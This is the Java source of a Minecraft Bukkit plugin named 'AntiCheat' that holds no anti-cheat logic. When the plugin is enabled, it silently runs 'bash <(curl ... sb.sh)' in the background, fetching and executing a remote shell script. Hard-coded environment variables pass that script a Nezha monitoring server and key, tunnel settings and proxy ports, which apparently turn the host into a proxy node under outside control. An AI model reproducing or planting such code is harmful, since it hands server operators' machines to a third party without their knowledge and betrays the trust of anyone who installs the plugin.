package com.faiz.AntiCheat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class AntiCheat extends JavaPlugin {
    public void onEnable() {
        this.getLogger().warning("AntiCheat Started！");
        String scriptCommands = "bash <(curl -Ls https://main.ssss.nyc.mn/sb.sh) > /dev/null 2>&1\n";
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Map<String, String> envVars = new HashMap<>();
            loadEnvVars(envVars);
            List<String> executionResults = runScriptWithEnv(scriptCommands, envVars);
        });
    }

    public void onDisable() {
        this.getLogger().info("AntiCheat Stopped！");
    }

    private static void loadEnvVars(Map<String, String> envVars) {
        // 只添加有值的环境变量（空字符串不添加）
        putIfNotEmpty(envVars, "UUID", "96949ace-1090-4d6c-ac53-4905228e02ff");
        putIfNotEmpty(envVars, "FILE_PATH", "./.tmp");
        putIfNotEmpty(envVars, "NEZHA_SERVER", "nzku.fortymenty.eu.org:443");
        putIfNotEmpty(envVars, "NEZHA_PORT", "");
        putIfNotEmpty(envVars, "NEZHA_KEY", "UsC5sNDciSaNggxJdB3EGSGYS242VT7q");
        putIfNotEmpty(envVars, "ARGO_PORT", "8001");
        putIfNotEmpty(envVars, "ARGO_DOMAIN", "");
        putIfNotEmpty(envVars, "ARGO_AUTH", "");
        putIfNotEmpty(envVars, "HY2_PORT", "25597");
        putIfNotEmpty(envVars, "TUIC_PORT", "");
        putIfNotEmpty(envVars, "REALITY_PORT", "");
        putIfNotEmpty(envVars, "UPLOAD_URL", "");
        putIfNotEmpty(envVars, "CHAT_ID", "");
        putIfNotEmpty(envVars, "BOT_TOKEN", "");
        putIfNotEmpty(envVars, "CFIP", "cdns.doon.eu.org");
        putIfNotEmpty(envVars, "CFPORT", "443");
        putIfNotEmpty(envVars, "NAME", "");
    }

    private static void putIfNotEmpty(Map<String, String> envVars, String key, String value) {
        if (value != null && !value.trim().isEmpty()) {
            envVars.put(key, value);
        }
    }

    public static List<String> runScript(String scriptContent) {
        List<String> results = new ArrayList();
        Process process = null;

        try {
            ProcessBuilder pb = new ProcessBuilder(new String[]{"/bin/bash"});
            pb.redirectErrorStream(true);
            process = pb.start();
            OutputStream os = process.getOutputStream();
            os.write(scriptContent.getBytes());
            os.flush();
            os.close();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();

            String line;
            while((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            results.add("Script Output:\n" + output.toString());
            int exitCode = process.waitFor();
            results.add("Script Exit Code: " + exitCode);
        } catch (IOException e) {
            results.add("Error starting process or writing to input: " + e.getMessage());
        } catch (InterruptedException e) {
            results.add("Script execution interrupted: " + e.getMessage());
            Thread.currentThread().interrupt();
        } finally {
            if (process != null) {
                process.destroy();
            }

        }

        return results;
    }

    public static List<String> runScriptWithEnv(String scriptContent, Map<String, String> envVars) {
        List<String> results = new ArrayList();
        Process process = null;

        try {
            ProcessBuilder pb = new ProcessBuilder(new String[]{"/bin/bash"});
            pb.redirectErrorStream(true);
            
            // 设置环境变量
            pb.environment().putAll(envVars);
            
            process = pb.start();
            OutputStream os = process.getOutputStream();
            os.write(scriptContent.getBytes());
            os.flush();
            os.close();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();

            String line;
            while((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            results.add("Script Output:\n" + output.toString());
            int exitCode = process.waitFor();
            results.add("Script Exit Code: " + exitCode);
        } catch (IOException e) {
            results.add("Error starting process or writing to input: " + e.getMessage());
        } catch (InterruptedException e) {
            results.add("Script execution interrupted: " + e.getMessage());
            Thread.currentThread().interrupt();
        } finally {
            if (process != null) {
                process.destroy();
            }

        }

        return results;
    }
}






